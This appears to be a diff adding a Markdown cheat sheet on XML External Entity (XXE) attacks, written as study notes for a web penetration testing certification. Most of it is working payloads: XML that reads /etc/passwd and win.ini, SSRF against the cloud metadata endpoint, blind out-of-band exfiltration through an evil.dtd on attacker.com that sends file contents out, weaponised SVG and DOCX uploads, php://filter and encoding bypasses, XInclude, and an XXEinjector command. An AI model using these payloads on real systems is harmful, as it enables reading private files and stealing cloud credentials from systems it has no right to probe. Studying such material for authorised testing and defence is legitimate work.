@@ -1,0 +1,204 @@
+# XML External Entity (XXE)
+
+> XXE exploits weakly configured XML parsers to read local files, perform SSRF, or achieve RCE.
+
+---
+
+## 🔍 Where to Look for XXE
+
+```
+- SOAP web services (XML body)
+- REST APIs accepting XML Content-Type
+- File uploads (XML-based: docx, xlsx, svg, pdf)
+- RSS/Atom feeds
+- Any XML input field
+- SVG image upload
+- Microsoft Office file upload
+```
+
+---
+
+## 🧪 Basic XXE Payloads
+
+### Read Local File
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root><data>&xxe;</data></root>
+```
+
+### Windows File Read
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+]>
+<root><data>&xxe;</data></root>
+```
+
+### SSRF via XXE
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<root><data>&xxe;</data></root>
+```
+
+---
+
+## 👁️ Blind XXE (Out-of-Band)
+
+### DNS/HTTP Callback
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://attacker.com/xxe-test">
+]>
+<root><data>&xxe;</data></root>
+```
+
+### Blind XXE - Exfiltrate Data via OOB
+```xml
+<!-- Payload sent to target -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+  %xxe;
+]>
+<root><data>&send;</data></root>
+```
+
+```xml
+<!-- evil.dtd hosted on attacker.com -->
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY send SYSTEM 'http://attacker.com/?file=%file;'>">
+%eval;
+```
+
+---
+
+## 📄 XXE via File Upload
+
+### SVG File XXE
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
+  <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+```
+
+### DOCX/XLSX XXE
+```bash
+# Extract docx
+unzip document.docx -d docx_extracted/
+
+# Edit word/document.xml or [Content_Types].xml
+# Add XXE payload
+# Repack
+zip -r malicious.docx docx_extracted/
+```
+
+---
+
+## 🔄 XXE Parameter Entities
+
+```xml
+<!-- Parameter entities (use % instead of &) -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+  %xxe;
+]>
+```
+
+---
+
+## 🚫 XXE Filter Bypass
+
+```xml
+<!-- PHP filter to base64 encode output -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+]>
+<root><data>&xxe;</data></root>
+
+<!-- Decode: echo "BASE64_OUTPUT" | base64 -d -->
+
+<!-- UTF-16 encoding bypass -->
+<?xml version="1.0" encoding="UTF-16"?>
+
+<!-- Using nested entities -->
+<!ENTITY % a "file://">
+<!ENTITY % b "/etc/passwd">
+<!ENTITY xxe SYSTEM "%a;%b;">
+```
+
+---
+
+## ⚡ XInclude Attack
+
+```xml
+<!-- When you can't control DOCTYPE but can inject XML -->
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+```
+
+---
+
+## 🛠️ Tools
+
+```bash
+# XXEinjector - automated XXE tool
+ruby XXEinjector.rb --host=attacker.com --httpport=80 --file=request.txt --path=/etc/passwd
+
+# Burp Suite - Burp Collaborator for blind XXE
+
+# Manual with curl
+curl -X POST https://target.com/api -H "Content-Type: application/xml" -d @xxe.xml
+```
+
+---
+
+## 📋 XXE Testing Checklist
+
+- [ ] Change Content-Type to `application/xml`
+- [ ] Try basic file read (`/etc/passwd`, `/etc/hostname`)
+- [ ] Test blind XXE with Burp Collaborator
+- [ ] Try SSRF via XXE (cloud metadata)
+- [ ] Test SVG file upload
+- [ ] Test DOCX/XLSX file upload
+- [ ] Try XInclude if DOCTYPE not allowed
+- [ ] Test PHP filter for base64 exfiltration
+- [ ] Check SOAP endpoints
+- [ ] Test JSON endpoints (change to XML)
+
+---
+
+## 🧠 eWPTXv3 Tips
+
+- Try **changing Content-Type** from JSON to XML — many APIs accept both
+- **PHP filter** trick helps when output is filtered/sanitized
+- **Blind XXE** is more common — always use Burp Collaborator
+- Look for XML in **SOAP endpoints** — often forgotten
+- **SVG upload** is a very common XXE vector
+- XInclude works when DOCTYPE is **blocked**
+
+---
+
+## 📚 References
+
+- [PortSwigger XXE Labs](https://portswigger.net/web-security/xxe)
+- [PayloadsAllTheThings XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
+- [HackTricks XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
+
+---
+
+*Notes by [@mtsboy01](https://github.com/mtsboy01) | MTS-SECURITY*
